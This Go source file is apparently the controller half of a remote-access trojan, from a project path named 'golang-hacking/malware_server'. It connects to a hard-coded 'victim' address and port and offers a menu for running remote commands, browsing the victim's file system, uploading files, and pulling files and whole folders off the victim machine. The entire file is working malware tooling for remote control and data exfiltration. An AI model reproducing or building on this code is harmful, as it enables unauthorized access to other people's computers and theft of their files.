package main

import (
	"bufio"
	"fmt"
	"golang-hacking/malware_server/core/download"
	executecommands "golang-hacking/malware_server/core/executeCommands"
	handleconnection "golang-hacking/malware_server/core/handleConnection"
	"golang-hacking/malware_server/core/move"
	uploadfiles "golang-hacking/malware_server/core/uploadFiles"
	"net"
	"os"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  int
}

func check_error(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func options() {
	fmt.Println()
	fmt.Println("\t[1] Execute Commands")
	fmt.Println("\t[2] Navigate File System")
	fmt.Println("\t[3] Upload Files")
	fmt.Println("\t[4] Download Files")
	fmt.Println("\t[5] Download Folders")
	fmt.Println("\t[0] Exit")
	fmt.Println()
}

func main() {
	var connection net.Conn

	IP := "192.168.2.8"
	Port := "9001"

	connection, err := handleconnection.Connect_with_victim(IP, Port)

	check_error(err)

	fmt.Println("[+] Connection established from ", connection.RemoteAddr().String())

	defer connection.Close()

	reader := bufio.NewReader(os.Stdin)

	loop_control := true

	for loop_control {
		options()
		fmt.Print("[+] Choose an option >> ")
		data, err := reader.ReadString('\n')

		check_error(err)

		connection.Write([]byte(data))
		cleaned_data := strings.TrimSuffix(data, "\n")

		switch {
		case cleaned_data == "1":
			fmt.Println("[+] Command Execution Program")
			err := executecommands.ExecuteRemoteCommand(connection)
			check_error(err)

		case cleaned_data == "2":
			fmt.Println("[+] Navigating the file system")
			err := move.Navigate_file_system(connection)
			check_error(err)

		case cleaned_data == "3":
			fmt.Println("[+] Uploading File to the Victim machine")
			err := uploadfiles.Upload_files(connection)
			check_error(err)

		case cleaned_data == "4":
			fmt.Println("[+] Downloading File from the Victim machine")
			err := download.Download_files_from_victim(connection)
			check_error(err)

		case cleaned_data == "5":
			fmt.Println("[+] Downloading Folder from the Victim machine")
			err := download.Download_folders_from_victim(connection)
			check_error(err)

		case cleaned_data == "0":
			fmt.Println("[-] Exiting the program")
			loop_control = false

		default:
			fmt.Println("[-] Invalid option!")
		}

	}

}
